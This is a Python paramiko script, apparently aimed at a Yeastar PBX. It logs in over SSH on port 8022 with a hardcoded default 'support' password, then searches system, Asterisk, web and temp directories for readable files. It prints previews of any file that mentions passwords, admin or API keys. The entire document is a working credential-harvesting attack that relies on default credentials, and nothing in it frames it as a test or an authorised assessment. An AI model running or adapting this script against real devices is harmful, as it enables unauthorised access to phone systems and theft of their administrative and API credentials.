import paramiko

host = "192.168.1.55"
port = 8022
username = "support"
password = "iyeastar"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(
    hostname=host,
    port=port,
    username=username,
    password=password,
    disabled_algorithms={
        'pubkeys': ['rsa-sha2-256', 'rsa-sha2-512']
    }
)

# Search for configuration files that might contain API or admin credentials
search_paths = [
    "/ysdisk/etc",
    "/ysdisk/ysapps/pbxcenter",
    "/etc/asterisk",
    "/ysdisk/var/www",
    "/tmp",
]

print("Searching for readable config files:")
print("="*60)

for path in search_paths:
    cmd = f"find {path} -type f -readable 2>/dev/null | head -20"
    stdin, stdout, stderr = client.exec_command(cmd)
    files = stdout.read().decode().strip()
    
    if files:
        print(f"\n{path}:")
        for file in files.split('\n')[:5]:
            print(f"  {file}")
            
            # Try to read the file
            read_cmd = f"cat {file} 2>/dev/null | head -50"
            stdin2, stdout2, stderr2 = client.exec_command(read_cmd)
            content = stdout2.read().decode()
            
            if content and ('password' in content.lower() or 'admin' in content.lower() or 'api' in content.lower()):
                print(f"    Content preview: {content[:200]}")

client.close()